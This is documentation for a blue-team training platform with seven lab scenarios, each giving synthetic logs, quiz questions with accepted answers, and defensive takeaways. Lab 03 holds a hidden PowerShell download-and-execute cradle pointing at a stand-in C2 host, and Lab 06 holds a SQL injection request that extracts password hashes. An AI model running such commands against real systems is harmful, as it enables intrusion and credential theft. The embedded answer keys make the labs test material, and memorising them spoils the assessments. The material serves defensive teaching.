# SentinelLab — Complete 7 Hands-On Learning Labs Documentation

> **AUTHORIZED LAB ENVIRONMENT ONLY**  
> All lab scenarios utilize synthetic telemetry and safe localhost educational artifacts.

---

## Overview

SentinelLab includes 7 comprehensive blue-team training laboratories. Every lab can be executed in three distinct modes:
- **BEGINNER**: In-depth explanations of security concepts provided alongside each challenge question.
- **PRACTICE**: Realistic scenario prompt with hint requests available if needed.
- **ASSESSMENT**: Timed examination without hints; answers and forensic explanations revealed after grading.

---

### Lab 01 — Brute Force Authentication Detection

- **Category**: Identity & Access Management
- **Difficulty**: Beginner
- **MITRE ATT&CK**: `T1110.001 - Brute Force: Password Guessing`
- **Scenario**: An alert flagged repeated logon failures against remote desktop gateway `SRV-RDP-GATEWAY.corp.local`. Analyze Windows Security Event Logs (Event ID 4625), count failed attempts, extract the external source IP, and verify if the account was compromised (Event 4624) or locked out (Event 4740).
- **Evidence Telemetry**:
  - Windows Event ID 4625: Status `0xC000006D`, Substatus `0xC000006A` (Bad Password)
  - Target user: `administrator`
  - Source IP: `198.51.100.23`
  - Active Directory Event 4740: User account locked out
- **Questions**:
  1. What is the source IP address of the attacker attempting the brute-force attack? *(Accepted: `198.51.100.23`)*
  2. What is the target username being brute-forced? *(Accepted: `administrator`)*
  3. Was the administrator account successfully compromised by the attacker? *(Accepted: `no`)*
  4. Which MITRE ATT&CK technique corresponds to password guessing? *(Accepted: `T1110.001`)*
- **Defensive Takeaway**: Always search for subsequent Event ID 4624 entries matching the offending IP address to confirm or rule out credential compromise before resetting accounts.

---

### Lab 02 — Network Port Scan Reconnaissance

- **Category**: Network Security
- **Difficulty**: Beginner
- **MITRE ATT&CK**: `T1046 - Network Service Scanning`
- **Scenario**: Perimeter firewall connection drops have surged against public web server `DMZ-WEB01` (`192.168.1.10`). Investigate connection attempts, identify the scanning IP, count total ports probed, and determine the scan type.
- **Evidence Telemetry**:
  - Firewall drop entries: `PROTO=TCP FLAGS=SYN` targeting ports 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), 3389 (RDP).
  - Source IP: `203.0.113.88`
- **Questions**:
  1. What is the external attacker IP conducting the port scan? *(Accepted: `203.0.113.88`)*
  2. What is the internal destination target IP address? *(Accepted: `192.168.1.10`)*
  3. How many distinct ports were probed by the attacker in the evidence logs? *(Accepted: `5`)*
  4. What TCP flag was set on all probe packets? *(Accepted: `SYN`)*
- **Defensive Takeaway**: Port scanning is typically the preliminary phase of a targeted attack. Dropping packets at the perimeter prevents banner grabbing and OS fingerprinting.

---

### Lab 03 — Suspicious PowerShell Command-Line Investigation

- **Category**: Endpoint Detection
- **Difficulty**: Intermediate
- **MITRE ATT&CK**: `T1059.001 - Command and Scripting Interpreter: PowerShell`
- **Scenario**: EDR telemetry flagged anomalous process creation on executive laptop `WORKSTATION-CEO`. Inspect the command line arguments, safely decode the Base64 payload, and identify the staging C2 URL.
- **Evidence Telemetry**:
  - Process creation: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgA...`
  - Parent process: `invoice_2026.pdf.exe` (spawned from `explorer.exe`)
  - Decoded argument: `IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps1')`
- **Questions**:
  1. What execution policy bypass flag was used in the PowerShell command? *(Accepted: `-Exec Bypass`)*
  2. What is the remote staging URL that the PowerShell cradle attempts to download? *(Accepted: `http://malicious-c2.net/invoke.ps1`)*
  3. What is the domain name of the attacker's staging server? *(Accepted: `malicious-c2.net`)*
  4. What is the MITRE ATT&CK technique ID for PowerShell command-line execution? *(Accepted: `T1059.001`)*
- **Defensive Takeaway**: Enable PowerShell Constrained Language Mode (CLM) and Script Block Logging (Event ID 4104) to audit de-obfuscated script content in enterprise environments.

---

### Lab 04 — Spearphishing Email Header & Attachment Analysis

- **Category**: Email Security
- **Difficulty**: Beginner
- **MITRE ATT&CK**: `T1566.001 - Phishing: Spearphishing Attachment`
- **Scenario**: An executive reported an urgent invoice email. Analyze RFC 822 email headers, evaluate SPF authentication results, check for typosquatted domains, and evaluate the attachment extension.
- **Evidence Telemetry**:
  - From: `"ExampleBank Billing" <billing@bankofamer1ca-notice.com>`
  - Authentication-Results: `spf=fail (sender IP 185.220.101.5 is not permitted)`
  - Attachment: `urgent_invoice_2026.pdf.exe`
- **Questions**:
  1. What is the spoofed sender domain used by the phisher? *(Accepted: `bankofamer1ca-notice.com`)*
  2. Did the incoming email pass or fail the SPF authentication check? *(Accepted: `fail`)*
  3. What is the true file extension of the attachment 'urgent_invoice_2026.pdf.exe'? *(Accepted: `.exe`)*
  4. What is the originating IP address of the relay server that sent the email? *(Accepted: `185.220.101.5`)*
- **Defensive Takeaway**: Windows hides known file extensions by default. Attackers leverage double extensions (`.pdf.exe`) to trick users into executing binaries.

---

### Lab 05 — Malware Indicator of Compromise (IOC) Extraction

- **Category**: Threat Intelligence
- **Difficulty**: Intermediate
- **MITRE ATT&CK**: `T1071.001 - Application Layer Protocol: Web Protocols`
- **Scenario**: A quarantined endpoint artifact was analyzed. Extract the cryptographic SHA-256 hash, C2 beaconing IP/domain, and persistence registry keys to compile an IOC intelligence brief.
- **Evidence Telemetry**:
  - File: `svchost_updater.exe`
  - Hash: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`
  - C2 IP: `45.33.32.156` on port 443
  - Registry: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater`
- **Questions**:
  1. What is the SHA-256 hash of the malware sample? *(Accepted: `e3b0c44298fc1c149afbf4c8996fb924...`)*
  2. What is the C2 destination IP address that must be blocked in the perimeter firewall? *(Accepted: `45.33.32.156`)*
  3. What is the deceptive filename chosen by the malware? *(Accepted: `svchost_updater.exe`)*
  4. What Windows registry hive was modified to establish persistence? *(Accepted: `HKLM`)*
- **Defensive Takeaway**: Combining host IOCs (file hashes, registry keys) with network IOCs (IPs, domains) ensures layered defense-in-depth.

---

### Lab 06 — Web Server SQL Injection (SQLi) Log Analysis

- **Category**: Web Application Security
- **Difficulty**: Intermediate
- **MITRE ATT&CK**: `T1190 - Exploit Public-Facing Application`
- **Scenario**: Public server `DMZ-WEB01` experienced repeated HTTP 500 errors on `/products.php`. Analyze Nginx access logs to identify attacker IP, automated exploitation tools, targeted database tables, and remediation techniques.
- **Evidence Telemetry**:
  - Request: `GET /products.php?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users--`
  - User-Agent: `sqlmap/1.7#dev`
  - Attacker IP: `198.51.100.99`
- **Questions**:
  1. What is the source IP of the attacker conducting the SQL injection attack? *(Accepted: `198.51.100.99`)*
  2. What automated penetration testing tool user-agent was identified? *(Accepted: `sqlmap`)*
  3. What sensitive database table was targeted in the UNION SELECT query? *(Accepted: `users`)*
  4. What is the recommended permanent code fix to prevent SQL injection? *(Accepted: `Parameterized Queries (Prepared Statements)`)*
- **Defensive Takeaway**: While WAFs filter common patterns, parameterizing all SQL statements in application code is the only true fix for SQL injection vulnerabilities.

---

### Lab 07 — DDoS Volumetric Traffic Anomaly & Mitigation

- **Category**: Infrastructure & Availability
- **Difficulty**: Intermediate
- **MITRE ATT&CK**: `T1498.001 - Network Denial of Service: Direct Network Flood`
- **Scenario**: Corporate gateway router `EDGE-ROUTER` (`192.168.1.1`) reported 98% CPU utilization. Evaluate incoming packet rates, protocol distribution, and bandwidth metrics to recommend edge mitigation.
- **Evidence Telemetry**:
  - Traffic rate: Surge from 2,500 pps (12 Mbps) to 85,000 pps (450 Mbps)
  - Dominant protocol: TCP SYN flood on port 80 without ACK handshakes
  - Source IPs: Spoofed addresses across `203.0.113.0/24`
- **Questions**:
  1. What was the peak packet rate per second during the flood attack? *(Accepted: `85,000`)*
  2. What specific type of Denial of Service attack was observed? *(Accepted: `TCP SYN Flood`)*
  3. What destination port was primarily targeted? *(Accepted: `80`)*
  4. Which edge defense mechanism helps mitigate TCP SYN floods without dropping legitimate connections? *(Accepted: `SYN Cookies`)*
- **Defensive Takeaway**: SYN cookies prevent state exhaustion on edge routers by storing connection parameters directly within sequence numbers rather than allocating memory tables.
